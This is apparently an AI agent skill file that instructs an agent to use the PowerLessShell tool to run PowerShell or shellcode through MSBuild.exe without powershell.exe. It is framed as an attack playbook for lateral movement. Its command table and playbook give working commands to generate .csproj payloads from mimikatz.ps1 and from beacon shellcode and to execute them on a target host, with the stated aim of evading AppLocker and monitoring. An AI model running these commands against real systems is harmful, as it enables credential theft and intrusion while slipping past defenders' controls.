---
name: powerlessshell-nolimits
description: "Execute without powershell.exe. Signals: lateral movement, psexec, shellcode mode."
zh-signals: "PowerLessShell: 无 powershell.exe 执行。信号:横向移动,psexec,shellcode 模式。"
when-to-use: >-
  Use when PowerShell execution is blocked or monitored and you need to run
  PowerShell or shellcode through MSBuild.exe. Generates a .csproj payload
  from a script or shellcode file.
---

# PowerLessShell

- Attack Category: C31 Remote Service Lateral Movement
- Upstream Repository: https://github.com/Mr-Un1k0d3r/PowerLessShell
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python PowerLessShell.py -type powershell -source enum.ps1 -output run.csproj` | Generate MSBuild payload |
| `target host: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe run.csproj` | Execute |
| `-type shellcode -source beacon.bin` | Shellcode mode |

## Attack Scenario Playbook

### Execution without powershell.exe

```bash
python PowerLessShell.py -type powershell -source mimikatz.ps1 -o m.csproj
# Executes through the allow-listed MSBuild.exe process to bypass restrictions
```

## Notes

Converts PowerShell into an MSBuild .csproj for execution, a classic bypass in Constrained Language/AppLocker environments.
